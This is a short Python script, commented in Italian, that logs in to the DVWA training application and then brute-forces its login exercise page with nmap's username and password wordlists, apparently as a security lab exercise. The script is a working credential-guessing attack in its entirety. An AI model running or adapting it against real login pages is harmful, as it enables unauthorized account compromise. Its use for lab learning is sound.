import requests

def logininiziale ():
	ip = input("Inserisci l'ip del server (192.168.50.101) : ")

	# URL di login
	url = "http://%s/dvwa/login.php" %ip

	# Dati di login
	payload = {
    	"username": "admin",
    	"password": "password",
    	"Login": "Login"
	}

	# Esegui la richiesta di login per ottenere il PHPSESSID e ottieni la risposta
	risposta = requests.post(url, data=payload)

	# Verifica che il login sia andato a buon fine
	if "Login failed" in risposta.text:
		print("\nLogin non valido. Prova a fornire credenziali diverse (APRI IL FILE .py E CAMBIA IL PAYLOAD\n")
    		#exit()

	# Estrai il PHPSESSID dal cookie della risposta di login
	phpsessid = risposta.request.headers.get('Cookie').split('; ')[1].split('=')[1]

	# Stampa il PHPSESSID a schermo
	print(f"PHPSESSID Che useremo: {phpsessid}\n")
	
	return phpsessid, ip

def bruteforce(header, ip):
	# Fornisci il path dei dizionari
	utenti_file_path = "/usr/share/nmap/nselib/data/usernames.lst"
	passwords_file_path = "/usr/share/nmap/nselib/data/passwords.lst"
	
	#Crea le liste dai dizionari
	with open(utenti_file_path, 'r') as utenti_file, open(passwords_file_path, 'r') as passwords_file:
    		utenti = utenti_file.readlines()
    		passwords = passwords_file.readlines()

	url = "http://%s/dvwa/vulnerabilities/brute/" %ip

	# Itera sui nomi utente e password e tenta il login
	for utente in utenti:
	    for password in passwords:
	        users = utente.strip()
	        passw = password.strip()
	        get_data = {"username": users, "password": passw, "Login": 'Login'}
	        print("\n-Utente:",users,"\n-Password:",passw)
	        r = requests.get(url, params=get_data, headers=header)
	        if not 'Username and/or password incorrect.' in r.text:
	            print("\nAccesso riuscito \nUtente:", users, "\nPassword:", passw)
	            exit()



# Ottieni il PHPSESSID dal metodo logininiziale
phpsessid, ip = logininiziale ()

# Costruisci l'header con il PHPSESSID
header = {"Cookie": f"security=low; PHPSESSID={phpsessid}"}

# Effettua il bruteforce con il metodo bruteforce passando come parametro l'header
bruteforce(header, ip)
